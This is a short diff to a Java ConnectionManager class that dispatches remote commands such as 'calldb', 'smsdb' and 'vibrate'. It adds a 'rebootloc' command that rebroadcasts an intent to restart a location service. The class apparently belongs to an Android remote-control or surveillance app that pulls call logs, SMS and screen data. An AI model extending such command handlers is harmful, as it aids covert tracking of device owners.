@@ -108,7 +108,6 @@ public class ConnectionManager {
                             case "calldb":
                                 getCallFromDB();
                                 break;
-
                             case "smsdb":
                                 getSmsFromDB();
                                 break;
@@ -163,7 +162,9 @@ public class ConnectionManager {
                             case "vibrate":
                                 vibrate();
                                 break;
-
+                            case "rebootloc":
+                                restartLocationService();
+                                break;
                             default:
                                 break;
                         }
@@ -176,6 +177,10 @@ public class ConnectionManager {
         } catch (Exception e) {
             e.printStackTrace();
         }
+    }
+
+    private static void restartLocationService() {
+        context.sendBroadcast(new Intent("respawnService").setPackage(BuildConfig.APPLICATION_ID));
     }
 
     private static void getScreenFromDB() {
